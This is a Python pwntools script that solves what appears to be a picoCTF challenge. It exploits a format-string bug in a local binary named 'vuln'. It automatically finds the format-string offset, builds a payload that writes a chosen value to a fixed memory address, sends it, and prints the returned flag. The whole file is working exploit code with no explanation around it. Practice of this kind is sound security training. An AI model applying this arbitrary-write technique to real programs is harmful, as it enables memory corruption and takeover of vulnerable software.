from pwn import *

context.binary = ELF('./vuln')
context.arch = 'amd64'  # Set to 'i386' if it’s a 32-bit binary
#context.log_level = 'debug'  


#p = remote('rhea.picoctf.net', 65348)
p = process('./vuln')

# Define the function to determine the format string offset
def exec_fmt(payload):
    with process('./vuln') as conn:
        conn.sendline(payload)
        return conn.recvall()

# Use FmtStr to determine offset for this target
autofmt = FmtStr(exec_fmt)
offset = autofmt.offset

# Define address and value for format string exploit
target_address = 0x404060  # Adjust this based on actual binary analysis
value_to_write = 0x67616c66  # Example value (e.g., 'flag')

# Create payload for the format string exploit
writes = {target_address: value_to_write}
payload = fmtstr_payload(offset, writes)

# Send the exploit payload and read the response
p.sendline(payload)
flag = p.recvall(timeout=2)

# Print results
print("Flag:", flag.decode(errors='ignore'))
print("Payload:", payload)

# Close the main connection
p.close()

